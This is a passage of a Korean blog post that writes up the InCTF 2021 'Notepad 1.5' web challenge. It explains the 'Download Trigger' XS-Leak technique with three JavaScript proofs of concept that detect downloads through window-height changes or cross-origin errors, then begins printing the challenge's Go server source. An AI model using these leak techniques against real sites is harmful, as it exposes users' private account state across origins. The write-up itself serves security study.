<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="InCTF 2021 Notepad 1.5 - Arthur’s Article Write Up" />
<meta property="og:locale" content="en" />
<meta name="description" content="This article is about write-up for the InCTF 2021. there is only one web challenge, which contain XS-Leak via Download Trigger bug" />
<meta property="og:description" content="This article is about write-up for the InCTF 2021. there is only one web challenge, which contain XS-Leak via Download Trigger bug" />
<link rel="canonical" href="http://localhost:4000/posts/In-CTF/" />
<meta property="og:url" content="http://localhost:4000/posts/In-CTF/" />
<meta property="og:site_name" content="Web2.0" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-08-17T08:29:53+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="InCTF 2021 Notepad 1.5 - Arthur’s Article Write Up" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-08-17T08:29:53+09:00","datePublished":"2021-08-17T08:29:53+09:00","description":"This article is about write-up for the InCTF 2021. there is only one web challenge, which contain XS-Leak via Download Trigger bug","headline":"InCTF 2021 Notepad 1.5 - Arthur’s Article Write Up","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/In-CTF/"},"url":"http://localhost:4000/posts/In-CTF/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>InCTF 2021 Notepad 1.5 - Arthur's Article Write Up | Web2.0
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<meta name="apple-mobile-web-app-title" content="Web2.0">
<meta name="application-name" content="Web2.0">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">


  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  
  <style>
  hr {
    background:white;
    height:1px;
    border:0;
}
.core-app-profile--audithistory--auditwrapper {
	border: 1px solid #beb3c5;
    border: 1px solid var(--color__border-l1);
    border-radius: 4px;
    background-color: var(--color__bg-l1);
    display: flex;
    flex-direction: column;
    padding: 1rem;
    cursor: pointer
}

:root,:root.dark {
    --color__label-red: #ed2360;
    --color__label-yellow: #ffd330;
    --color__label-green: #17a05a;
    --color__label-blue: #2d20e2;
    --color__label-purple: #7549ff;
    --color__label-cyan: #18b4f8;
    --color__text-primary: #e6e6e6;
    --color__text-secondary: #adabb2;
    --color__text-tertiary: #8d8a99;
    --color__text-disabled: #6b6680;
    --color__text-yellow: #ffe878;
    --color__text-destructive: #ff6a8c;
    --color__text-primary-inv: #3f3c4f;
    --color__bg-l0: #1a1825;
    --color__bg-l1: #22202d;
    --color__bg-l2: #2e2b3b;
    --color__bg-l3: #3a3649;
    --color__bg-sidebar: #22202d;
    --color__bg-main: #1a1825;
    --color__bg-hover-l0: #1e1c2b;
    --color__bg-hover-l1: #272432;
    --color__bg-hover-l2: #332f41;
    --color__bg-l0-inv: #fff;
    --color__border-l0: #322f3f;
    --color__border-l1: #322f3f;
    --color__border-l2: #403c4d;
    --color__border-l3: #4f4c5f;
    --color__border-tertiary: rgba(208,204,255,.059);
    --color__overlay: #110f19;
    --font-size__header-xl: 1.625rem;
    --font-size__header-lg: 1.5rem;
    --font-size__header-md: 1.375rem;
    --font-size__header-sm: 1.25rem;
    --font-size__core-copy: 1.125rem;
    --font-size__lg: 1.063rem;
    --font-size__md: 0.938rem;
    --font-size__sm: 0.813rem;
    --color__alert-warning-text: #ebfcff;
    --color__alert-warning-text-secondary: #a1e6ff;
    --color__alert-warning-bg: #052947;
    --color__alert-warning-border: #085f96;
    --color__alert-error-text: #fff0f2;
    --color__alert-error-text-secondary: #ffcbd5;
    --color__alert-error-bg: #650126;
    --color__alert-error-border: #c70948
}
@media(prefers-reduced-motion:no-preference) {
    a {
        transition: color .2s ease-in-out
    }
}
.core-app-profile__bodybottom {
	width:100%;
	order:3;
	display:flex;
	flex-direction:column;
	gap:2rem
}

.profile--audithistory--loadmore {
	text-align:center
}
.profile--audithistory--loadmore hr {
	height:2px;
	background:#7549ff
}
.profile--audithistory--loadmore button {
	color:#fff;
	font-size:16px;
	width:max-content;
	margin:5px auto;
	display:flex;
	flex-direction:row;
	gap:5px;
	justify-content:center;
	align-items:center;
	cursor:pointer
}
.profile--audithistory--loadmore button svg {
	width:16px;
	height:16px
}
.profile--audithistory--loadmore button svg path {
	fill:#7549ff
}
.profile--audithistory--loadmore .audithistory--unavailable {
	margin-top:1rem;
	border:2px solid #2e2b3b;
	border-radius:.25rem;
	padding:1rem
}
.profile--audithistory--loadmore .audithistory--unavailable p {
	font-size:.875rem;
	line-height:1.125rem;
	text-align:start
}
.profile--audithistory--loadmore .audithistory--unavailable p strong {
	color:#fff
}
.profile--audithistory--auditsponsorimg {
	min-width:50px;
	min-height:50px;
	max-width:50px;
	max-height:50px;
	border-radius:50%
}
.profile--audithistory--auditheading {
	position:relative;
	display:flex;
	flex-direction:row;
	gap:14px;
	left:-15px;
	align-items:flex-end
}
.profile--audithistory--auditheading--date {
	font-size:14px;
	line-height:18px
}
.profile--audithistory--auditheading--title {
	font-size:20px;
	line-height:24px;
	color:#fff
}
.profile--audithistory--monthwrapper {
	margin-top:30px
}
.profile--audithistory--auditwrapper {
	position:relative;
	height:auto;
	margin:10px 0 30px 15px
}
.profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	margin-bottom:25px
}
.profile--audithistory--heading p {
	font-size:18px;
	color:#fff;
	white-space:nowrap
}
.profile--audithistory--heading hr {
	border:1px solid #2e2b3b;
	width:100%;
	height:1px
}
.profile--auditseverity {
	position:relative
}
.profile--auditseverity--lineconnector {
	position:relative;
	left:9px;
	min-height:15px;
	width:.5px;
	background-color:#2e2b3b
}
.profile--auditseverity--lineconnector:last-of-type {
	position:absolute;
	bottom:0
}
.profile--auditseverity--ring {
	width:25px;
	height:25px;
	border-radius:50%;
	display:flex;
	align-items:center;
	justify-content:center;
	position:relative;
	left:-3px
}
.profile--auditseverity--ring--inner {
	border-radius:50%;
	width:5px;
	height:5px;
	background:#fff
}
.profile--auditseverity--severity {
	position:relative;
	display:flex;
	margin-left:45px;
	top:-24px
}
.profile--auditseverity--severity--heading {
	color:var(--color__text-primary)
}
.profile--auditseverity--severity--content {
	margin-left:8px
}
.profile--auditseverity--severity--content--flexwrapper {
	display:flex;
	column-gap:8px;
	row-gap:5px;
	align-items:center;
	flex-wrap:wrap;
	margin-bottom:5px
}
.profile--auditseverity--severity--decorator {
	min-width:4px;
	max-width:4px;
	height:auto
}
.profile--auditseverity--severity--locked {
	font-size:12px;
	display:flex;
	gap:5px;
	flex-direction:row;
	justify-content:flex-start;
	align-items:center
}
.profile--auditseverity--severity--title {
	color:#fff;
	font-weight:semibold;
	overflow-wrap:anywhere
}
.core-app-profile--audithistory--monthwrapper {
	margin-top:40px;
	display:flex;
	flex-direction:column;
	gap:1rem
}
.core-app-profile--audithistory--monthwrapper:first-child {
	margin-top:0
}
.core-app-profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	justify-content:space-between;
	font-size:var(--font-size__header-md);
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--auditwrapper {
	border: 1px solid #beb3c5;
	border-radius:4px;
	background-color:var(--color__bg-l1);
	display:flex;
	flex-direction:column;
	padding:1rem;
	cursor:pointer
}
.core-app-profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	justify-content:space-between;
	font-size:var(--font-size__header-md);
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--auditheading {
	position:relative;
	display:flex;
	flex-direction:row;
	gap:14px;
	align-items:center;
	justify-content:space-between
}
.core-app-profile--audithistory--content-wrapper {
	
	flex:1 1;
	position:relative;
	display:flex;
	flex-direction:column;
	gap:14px
}
@media(min-width:450px) {
	.core-app-profile--audithistory--content-wrapper {
		flex-direction:row;
		align-items:center;
		justify-content:space-between
	}
}
.core-app-profile--audithistory--header-wrapper {
	display:flex;
	flex-direction:row;
	gap:14px;
	align-items:center
}
.core-app-profile--audithistory--title {
	font-size:20px;
	line-height:24px;
	font-weight:700;
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--date {
  text-overflow:ellipsis
	white-space:nowrap
}
.core-app-profile--audithistory--wrapper {
	display:flex;
	flex-direction:column-reverse;
	height:100%
}
  </style>

  <!-- A placeholder to allow defining custom metadata -->

  <script src="https://code4rena.com/_next/static/chunks/app/%5B@username%5D/page-20c23029062acd7f.js"></script>
</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle">
      
        
        <img src="/assets/img/ant.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'">
      
    </a>

    <h1 class="site-title">
      <a href="/">Web2.0</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Amennnn</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <li class="nav-item">
          <a href="https://evm.pics" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i><span>ABOUT</span>
          </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://x.com/l0ptus"
          aria-label="x"
          

          

          

          
        >
          <i class="fab fa-twitter"></i>
        </a>
      
    
      

      
        <a
          href="https://blockscan.com/address/0xc39777E85d97a0B5655C62C6378F00D494feAce1"
          aria-label="wallet"
          

          

          

          
        >
          <i class="fab fa-ethereum"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    style="background-color:#030014"
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                Home
              </a>
            </span>

          
        
          
        
          
            
              <span>InCTF 2021 Notepad 1.5 - Arthur's Article Write Up</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>InCTF 2021 Notepad 1.5 - Arthur's Article Write Up</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1629156593"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug 17, 2021
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://x.com/l0ptus">anonymous</a>
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="3236 words"
>
  <em>17 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <h1 id="what-is-download-trigger">What is Download Trigger?</h1>

<p><a href="https://user-images.githubusercontent.com/49112423/129486098-81fcc315-0f12-4cd5-a414-e09bb8238e71.png" class="popup img-link  shimmer"><img src="https://user-images.githubusercontent.com/49112423/129486098-81fcc315-0f12-4cd5-a414-e09bb8238e71.png" alt="image" loading="lazy"></a></p>

<p>엔드포인트에서 <code class="language-plaintext highlighter-rouge">Content-Disposition: attachment</code> 헤더가 설정이 되면 브라우저는 응답을 하는 대신에 다운로드 할 파일을 탐색한다고 합니다. 특정 상황에 따라서 사용자의 계정 상태 및 여러 요소들에 따라서 달라지는 경우를 이용해서 중요 정보를 수집할 수 있습니다.</p>

<p><a href="https://user-images.githubusercontent.com/49112423/129486089-6b3179ed-13c5-4545-b8cf-2e957797d8ca.png" class="popup img-link  shimmer"><img src="https://user-images.githubusercontent.com/49112423/129486089-6b3179ed-13c5-4545-b8cf-2e957797d8ca.png" alt="image" loading="lazy"></a>
<a href="https://user-images.githubusercontent.com/49112423/129486161-316cf985-49e8-4f94-aa13-567cd166e523.png" class="popup img-link  shimmer"><img src="https://user-images.githubusercontent.com/49112423/129486161-316cf985-49e8-4f94-aa13-567cd166e523.png" alt="image" loading="lazy"></a></p>

<p>Download Trigger 기법 중 첫 번째 방식은 크로니움 기반 브라우저에서 파일을 다운로드 하게 되면 위와 같이 브라우저 하단에 다운로드 한 파일의 미리 보기가 나타나는 것을 이용하는 것 입니다. 파일이 다운로드 될 때와, 다운로드가 되지 않을 때의 창 높낮이를 이용해서 정보를 유추하는 방식입니다.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">screenHeight</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerHeight</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://github.com/wjddnjs33/Exploit/archive/refs/heads/main.zip</span><span class="dl">'</span><span class="p">);</span>

<span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">innerHeight</span> <span class="o">&lt;</span> <span class="nx">screenHeight</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Download bar detected</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Download bar not detected</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">},</span> <span class="mi">2000</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>
<p>POC는 위와 같습니다.</p>

<p><a href="https://user-images.githubusercontent.com/49112423/129486249-b6607571-d727-4d57-b127-12556efa3d7c.png" class="popup img-link  shimmer"><img src="https://user-images.githubusercontent.com/49112423/129486249-b6607571-d727-4d57-b127-12556efa3d7c.png" alt="image" loading="lazy"></a></p>

<p>정상적으로 파일이 다운로드 되었을 때 입니다.</p>

<p><a href="https://user-images.githubusercontent.com/49112423/129486284-a012c229-51dd-4203-8697-3b9dfa912bcb.png" class="popup img-link  shimmer"><img src="https://user-images.githubusercontent.com/49112423/129486284-a012c229-51dd-4203-8697-3b9dfa912bcb.png" alt="image" loading="lazy"></a></p>

<p>파일이 다운로드 되지 않았을 때 입니다.</p>

<p>정상적으로 파일이 다운로드가 되었을 때는, 브라우저 하단에 생성된 창에 의해서 기본의 창에 크기보다 작아 졌기 때문에 다운로드 바가 탐지 되어 다고 출력이 되고, 되지 않았을 때는 창의 크기가 그대로이므로 다운로드 바가 탐지 되지 않았다고 출력 되는 것을 볼 수 있습니다.</p>

<p><a href="https://user-images.githubusercontent.com/49112423/129486501-7caca57c-97ae-4eb2-a7fa-57f9c472bd1d.png" class="popup img-link  shimmer"><img src="https://user-images.githubusercontent.com/49112423/129486501-7caca57c-97ae-4eb2-a7fa-57f9c472bd1d.png" alt="image" loading="lazy"></a></p>

<p>두 번째 방식은 iframe을 이용해서 첨부 파일 탐색이 되었을 때, iframe이 교차 출처로 되는 것을 이용해서 판단하는 기법입니다.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://github.com/wjddnjs33/Exploit/archive/refs/heads/main.zip</span><span class="dl">'</span><span class="p">;</span>

<span class="kd">var</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>

<span class="nx">iframe</span><span class="p">.</span><span class="nx">srcdoc</span> <span class="o">=</span> <span class="s2">`&lt;iframe src="</span><span class="p">${</span><span class="nx">url</span><span class="p">}</span><span class="s2">" &gt;&lt;/iframe&gt;`</span><span class="p">;</span>
<span class="nx">iframe</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="k">try</span> <span class="p">{</span>
          <span class="nx">iframe</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">origin</span><span class="p">;</span>
          <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Download attempt detected</span><span class="dl">'</span><span class="p">);</span>
      <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
          <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">No download attempt detected</span><span class="dl">'</span><span class="p">);</span>
      <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>POC는 위와 같습니다.</p>

<p><a href="https://user-images.githubusercontent.com/49112423/129486548-895bce61-2348-4f3b-aef6-bb4780540b1a.png" class="popup img-link  shimmer"><img src="https://user-images.githubusercontent.com/49112423/129486548-895bce61-2348-4f3b-aef6-bb4780540b1a.png" alt="image" loading="lazy"></a></p>

<p>세 번째 방식은 두 번째 방식과 원리는 동일 하지만 iframe을 사용하지 않고 트리거 하는 방식 입니다.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://example.org</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>

<span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="k">try</span> <span class="p">{</span>
          <span class="c1">// If a navigation occurs, the iframe will be cross-origin,</span>
          <span class="c1">// so accessing "win.origin" will throw an exception</span>
          <span class="nx">win</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
          <span class="nx">parent</span><span class="p">.</span><span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Download attempt detected</span><span class="dl">'</span><span class="p">);</span>
      <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
          <span class="nx">parent</span><span class="p">.</span><span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">No download attempt detected</span><span class="dl">'</span><span class="p">);</span>
      <span class="p">}</span>
<span class="p">},</span> <span class="mi">2000</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>
<p>POC는 위와 같습니다.</p>

<hr />
<h1 id="exploit-web-inctf-2021---notepad-15---arthurs-article-900-pts">Exploit (Web) InCTF 2021 - Notepad 1.5 - Arthur’s Article [900 pts]</h1>

<blockquote>
  <p>Notepad 1.5 - Arthur’s Article 문제는 XS-Leak을 이용하여 플래그를 획득하는 문제 입니다.</p>
</blockquote>

<div class="language-go highlighter-rouge"><div class="code-header">
        <span data-label-text="Go"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
</pre></td><td class="rouge-code"><pre><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
	<span class="s">"crypto/md5"</span>
	<span class="s">"encoding/hex"</span>
	<span class="s">"flag"</span>
	<span class="s">"fmt"</span>
	<span class="s">"html"</span>
	<span class="s">"log"</span>
	<span class="s">"math/rand"</span>
	<span class="s">"net/http"</span>
	<span class="s">"os"</span>
	<span class="s">"regexp"</span>
	<span class="s">"strings"</span>
	<span class="s">"time"</span>

	<span class="s">"github.com/gorilla/handlers"</span>
	<span class="s">"github.com/gorilla/mux"</span>
